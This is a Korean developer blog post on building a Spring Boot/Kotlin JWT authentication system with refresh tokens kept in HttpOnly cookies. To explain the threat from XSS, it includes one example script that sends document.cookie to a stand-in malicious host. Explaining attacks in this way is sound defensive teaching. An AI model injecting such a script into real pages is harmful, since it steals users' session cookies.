---
title: "시대팅5 JWT 인증 시스템 구축하기"
date: 2024-12-18T08:00:00.000Z
categories: [Project, 시대팅5]
tags: [spring-boot, jwt, cookie]
---

## 배경

![account server](/assets/img/project/sidaeting5/03-jwt/slack-noti-account-server-down.png)
_잦은 에러로 인해 사용할 수 없었던 어카운트 서버_

기존 시대생의 서비스들은 정보기술관 온프레미스(On-premise) 환경의 **어카운트 서버**를 사용하여 인증을 처리했다. 하지만 이 서버는 알 수 없는 이유로 **간헐적인 장애**가 발생했고, 이로 인해 시대생 앱에서 사용자들의 로그인이 예기치 않게 풀리는 등 **사용자 경험을 저하**시키는 문제가 빈번하게 발생했다.

시대팅은 결제 기능이 포함된 서비스이며, 짧은 기간 동안 안정적인 운영이 필수적이었다. 따라서 불안정한 기존 어카운트 서버를 계속 사용하는 것은 서비스 운영에 큰 위험요소가 될 것이라 판단했다. 이에 회의를 통해 시대팅은 기존 온프레미스 환경 대신 **AWS 환경**에서 운영하고, **자체적인 JWT 인증 시스템**을 구축하기로 결정했다.

### JWT란?

JWT는 **JSON Web Token**의 약자로, 클라이언트와 서버 간의 정보 교환을 안전하고 간편하게 처리하기 위한 **토큰 기반 인증 방식**이다. 이 방식은 Header, Payload, Signature 세 가지 구성 요소로 이루어져 있다.

- **Header**: 토큰 타입(JWT)과 알고리즘 정보(예: HS256)가 포함된다.
    
  ```json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```
    
- **Payload**: 사용자 정보와 클레임(claim)으로 구성되며, 예시는 다음과 같다.
    
  ```json
  {
    "sub": "1234567890",
    "name": "John Doe",
    "admin": true
  }
  ```
    
- **Signature**: Header와 Payload를 비밀키로 서명한 값으로, 토큰의 무결성을 보장한다.

아래는 Header와 Payload, 비밀키로 서명된 Signature로 구성된 JWT의 예시이다.

![image.png](/assets/img/project/sidaeting5/03-jwt/jwt-example.png)

**JWT를 선택한 주된 이유**는 **확장성** 때문이다. 우리의 서비스는 예상 이용자 수가 1000명 이상이었기 때문에 서버가 인증 상태를 별도로 저장할 필요가 없는 **stateless** 방식인 JWT를 사용하는 것이 더 나을 것이라고 판단하였다. 반면 세션 기반 인증은 서버 메모리나 DB에 상태를 저장해야 하므로 더 복잡한 구조를 가진다.

추가적으로 프로젝트 초기에는 로그인 기능(아이디-비밀번호 방식, 소셜 로그인 방식)도 논의했으나, 단기 서비스 특성상 비효율적이라는 의견이 있어 **이메일 인증**을 통해 재학생임을 확인하고, **토큰을 길게 발급**하여 추가 인증을 요구하지 않는 방식을 사용하기로 결정했다.

![image.png](/assets/img/project/sidaeting5/03-jwt/slack-social-login.png)
_소셜 로그인 제안_

## JWT 구현

우선 **액세스 토큰**과 **리프레시 토큰**의 역할을 각각 **인증**과 **세션 관리**로 구분하였다. 또한 액세스 토큰이 만료되었을 경우 **리프레시 토큰**을 이용해 **새로운 액세스 토큰을 재발급**하도록 하였다. (이후 개선과정에서 리프레시 토큰도 함께 재발급하도록 수정하였음)

### 설정

- `build.gradle.kts`

  ```kotlin
  dependencies {
      // spring security
      implementation("org.springframework.boot:spring-boot-starter-security")

      // jwt
      compileOnly("io.jsonwebtoken:jjwt-api:0.12.6")
      runtimeOnly("io.jsonwebtoken:jjwt-impl:0.12.6")
      runtimeOnly("io.jsonwebtoken:jjwt-jackson:0.12.6")
  }
  ```

- **시크릿 키** (`.env`)
    
  ```
  JWT_ACCESS_SECRET=your_access_token_secret_key
  JWT_REFRESH_SECRET=your_refresh_token_secret_key
  ```
    
- **토큰 유효기간 설정** (`application.yml`)
  - 액세스 토큰은 1시간, 리프레시 토큰은 7일로 설정했다.
  - 서비스 운영 기간을 일주일로 계획하였기 때문에, 유저가 재로그인하는 불편함을 최소화하고자 했다.
    
  ```yaml
  jwt:
      access:
          secret: ${JWT_ACCESS_SECRET}
          expiration: 3600000 # 유효기간(ms): 1시간
      refresh:
          secret: ${JWT_REFRESH_SECRET}
          expiration: 604800000 # 유효기간(ms): 7일
  ```
    
- `SecurityConfig.kt`
    
  ```kotlin
  @Configuration
  @EnableWebSecurity
  class SecurityConfig(
      private val jwtAuthenticationFilter: JwtAuthenticationFilter,
  ) {
      @Bean
      @Throws(Exception::class)
      fun filterChain(http: HttpSecurity): SecurityFilterChain? {
          http.addFilterBefore(
              jwtAuthenticationFilter,
              UsernamePasswordAuthenticationFilter::class.java
          )
          return http.build()
      }
  ```
    
- `JwtAuthenticationFilter.kt`
    
  ```kotlin
  @Component
  class JwtAuthenticationFilter(
      private val authService: AuthService,
  ) : OncePerRequestFilter() {
  
      override fun doFilterInternal(
          request: HttpServletRequest,
          response: HttpServletResponse,
          filterChain: FilterChain,
      ) {
          val token =
              request.getHeader(SecurityConstants.TOKEN_HEADER)
                  ?: return filterChain.doFilter(request, response)
  
          try {
              val userId = authService.getAuthenticatedUserId(token)
  
              val principal =
                  JwtUserDetails(
                      id = userId.toString(),
                      authorities = MutableList(1) { GrantedAuthority { "ROLE_USER" } },
                  )
  
              SecurityContextHolder.getContext().authentication =
                  UsernamePasswordAuthenticationToken(principal, "", principal.authorities)
  
              filterChain.doFilter(request, response)
          } catch (e: Exception) {
              logger.error(e)
              throw UnauthorizedException()
          }
      }
  }
  ```
    

### 주요 기능

**토큰 생성**

JWT 생성에는 **HS256** 알고리즘을 사용했다. 토큰 생성 시 비밀키와 함께 Header 및 Payload를 조합하여 서명(Signature)을 생성했다.

```kotlin
@Component
class JwtTokenGenerator(
    @Value("\${jwt.access.secret}") private val accessSecret: String,
    @Value("\${jwt.refresh.secret}") private val refreshSecret: String,
    @Value("\${jwt.access.expiration}") private val accessTokenExpiration: Long,
    @Value("\${jwt.refresh.expiration}") private val refreshTokenExpiration: Long,
) {
    private val accessKey = Keys.hmacShaKeyFor(accessSecret.toByteArray())
    private val refreshKey = Keys.hmacShaKeyFor(refreshSecret.toByteArray())
    
    fun createAccessToken(id: Long): String {
        return createToken(id, accessKey, accessTokenExpiration)
    }

    fun createRefreshToken(id: Long): String {
        return createToken(id, refreshKey, refreshTokenExpiration)
    }

    private fun createToken(id: Long, key: SecretKey, expiration: Long): String {
        val now = Date()
        val validity = Date(now.time + expiration)

        return Jwts.builder()
            .subject(id.toString())
            .issuer(SecurityConstants.TOKEN_ISSUER)
            .audience()
            .add(SecurityConstants.TOKEN_AUDIENCE)
            .and()
            .issuedAt(now)
            .expiration(validity)
            .signWith(key, Jwts.SIG.HS256)
            .compact()
    }
}
```

**토큰 검증**

```kotlin
fun getAuthenticatedUserId(token: String): Long {
    val jwt = extractToken(token)

    if (!jwtTokenProvider.validateAccessToken(jwt)) {
        throw JwtTokenInvalidSignatureException()
    }
    return jwtTokenProvider.getUserIdFromAccessToken(jwt)
}
```

### Refresh Token

![httponly cookie slack](/assets/img/project/sidaeting5/03-jwt/slack-httponly-cookie.png)
_프론트엔드 팀원과의 토큰 관리 방법 논의 과정_

기존 어카운트 서버는 액세스 토큰과 리프레시 토큰을 모두 응답 DTO에 담아서 반환했다. 하지만 이러한 방식이 토큰 탈취의 위험성이 있다는 의견이 있어 이번 프로젝트에는 **HttpOnly 쿠키**를 사용하여 리프레시 토큰을 관리하기로 결정했다.

**HttpOnly 쿠키**

HttpOnly 쿠키는 서버에서 설정한 특별한 속성의 쿠키로, **클라이언트 측 스크립트(JavaScript)에서 접근이 불가능**하다. 일반 쿠키는 `document.cookie`를 통해 JavaScript로 접근할 수 있지만, HttpOnly 쿠키는 **오직 HTTP(S) 요청**을 통해서만 서버로 전송된다. 이러한 특성으로 인해 **XSS 공격**으로부터 토큰을 효과적으로 보호할 수 있다.

- **XSS(Cross-Site Scripting) 공격**

  XSS 공격은 웹 애플리케이션의 취약점을 이용하여 사용자의 **브라우저에 악성 스크립트를 주입**하는 공격이다. 예를 들어, 다음과 같은 스크립트를 게시판에 삽입하여 사용자의 쿠키 정보를 탈취할 수 있다.

  ```js
  new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
  ```

  이 스크립트는 새로운 이미지 객체를 생성하고 악성 서버의 URL을 이미지 소스로 설정한다. URL에는 사용자의 쿠키 정보가 쿼리 파라미터로 포함되어 있어, 브라우저가 이미지를 로드하려 할 때 쿠키 정보가 자동으로 악성 서버로 전송된다.

추가로 다음과 같은 보안 설정을 적용했다.

- `Secure` 플래그를 통해 **HTTPS 연결**에서만 쿠키가 전송되도록 설정
- `SameSite=None` 설정으로 **크로스 사이트 요청** 시에도 쿠키가 전송되도록 구성
- **URL 인코딩**을 통해 특수문자로 인한 문제 방지

**쿠키 관리 유틸리티**

- `CookieUtils.kt`
    
  ```kotlin
  @Component
  class CookieUtils(
      @Value("\${app.cookie.domain}") private val domain: String,
      @Value("\${app.cookie.secure}") private val secure: Boolean
  ) {
      fun addRefreshTokenCookie(
          response: HttpServletResponse,
          refreshToken: String,
          maxAgeMilliSecond: Long
      ) {
          val encodedRefreshToken = URLEncoder.encode(refreshToken, StandardCharsets.UTF_8)
          val cookie =
              ResponseCookie.from("refresh_token", encodedRefreshToken)
                  .domain(domain)
                  .httpOnly(true)
                  .secure(secure)
                  .path("/")
                  .maxAge(maxAgeMilliSecond / 1000)
                  .sameSite("None")
                  .build()
          response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString())
      }
  ```
    

![image.png](/assets/img/project/sidaeting5/03-jwt/dev-tools-refresh-token.png)

**토큰 재발급 프로세스**

- **API 엔드포인트**: `POST /api/auth/reissue`

클라이언트는 리프레시 토큰을 사용하여 **새로운 액세스 토큰**을 재발급 받을 수 있다.  재발급 과정은 다음과 같은 순서로 진행된다.

1. 쿠키에서 리프레시 토큰 추출
2. 리프레시 토큰의 유효성 검증
3. 새로운 액세스 토큰 생성

```kotlin
fun reissueTokens(request: HttpServletRequest): JwtResponse {
    val refreshToken = cookieUtils.getRefreshTokenFromCookie(request)

    val userId = jwtTokenProvider.getUserIdFromRefreshToken(refreshToken)

    val newAccessToken = jwtTokenProvider.createAccessToken(userId)

    return JwtResponse(newAccessToken)
}
```

**로그아웃 처리**

- **API 엔드포인트**: `POST /api/auth/logout`

클라이언트가 로그아웃을 요청한 경우, 다음과 같은 보안 조치를 수행한다.

1. 리프레시 토큰의 유효성 검증
2. 리프레시 토큰이 저장된 쿠키 삭제

![image.png](/assets/img/project/sidaeting5/03-jwt/dev-tools-after-logout.png)

- `AuthService.kt`
    
  ```kotlin
  fun logout(request: HttpServletRequest, response: HttpServletResponse) {
      val refreshToken = cookieUtils.getRefreshTokenFromCookie(request)
      ...
      cookieUtils.deleteRefreshTokenCookie(response)
  }
  ```
    
- `CookieUtils.kt`
    
  ```kotlin
  fun deleteRefreshTokenCookie(response: HttpServletResponse) {
      val cookie =
          ResponseCookie.from("refresh_token", "")
              .domain(domain)
              .httpOnly(true)
              .secure(secure)
              .path("/")
              .maxAge(0)
              .build()
      response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString())
  }
  ```
    

## 기타

### Bearer prefix 설정 문제

- 초기에는 서버에서 액세스 토큰 앞에 `"Bearer "` 접두사를 붙여 반환했으나, 클라이언트 측에서 이미 Bearer를 포함하여 요청하는 방식으로 변경했다. 이로 인해 불필요한 문자열 처리 로직을 제거할 수 있었다.

- 기존 응답 DTO
    
  ```kotlin
  data class JwtResponse(
      private val rawAccessToken: String
  ) {
      val accessToken: String
          get() = SecurityConstants.TOKEN_PREFIX + rawAccessToken
  }
  ```
    
- 수정된 응답 DTO
    
  ```kotlin
  data class JwtResponse(val accessToken: String)
  ```
    

## 참고자료

- [JSON Web Token Introduction - jwt.io](https://jwt.io/introduction)
- [JWT vs Session Authentication - DEV Community](https://dev.to/codeparrot/jwt-vs-session-authentication-1mol)
- [Using HTTP cookies - HTTP \| MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [Document: cookie property - Web APIs \| MDN](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)
- [Cookies and security - Human Who Codes](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/)
- [[Spring] jwt토큰을 더 안전하게 ! (RefreshToken , Cookie) — sudoSoooooo](https://soobysu.tistory.com/67)
- [node.js - How to extract token string from Bearer token? - Stack Overflow](https://stackoverflow.com/questions/50284841/how-to-extract-token-string-from-bearer-token)
